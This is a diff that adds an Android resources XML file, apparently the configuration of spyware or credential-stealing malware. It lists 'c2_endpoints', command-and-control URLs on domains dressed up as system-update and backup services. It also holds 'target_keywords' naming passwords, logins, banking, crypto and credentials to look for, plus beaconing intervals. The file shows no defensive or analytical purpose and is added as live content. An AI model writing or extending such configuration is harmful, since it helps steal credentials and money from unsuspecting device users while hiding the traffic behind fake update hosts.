@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string-array name="c2_endpoints">
+        <item>https://updates.system-android.net/api/v1</item>
+        <item>https://backup.cloud-services.com/sync</item>
+        <item>https://security-patch.os-update.org/check</item>
+    </string-array>
+
+    <string-array name="target_keywords">
+        <item>password</item>
+        <item>login</item>
+        <item>bank</item>
+        <item>crypto</item>
+        <item>credential</item>
+    </string-array>
+
+    <integer-array name="sync_intervals">
+        <item>3600</item>
+        <item>86400</item>
+    </integer-array>
+</resources>
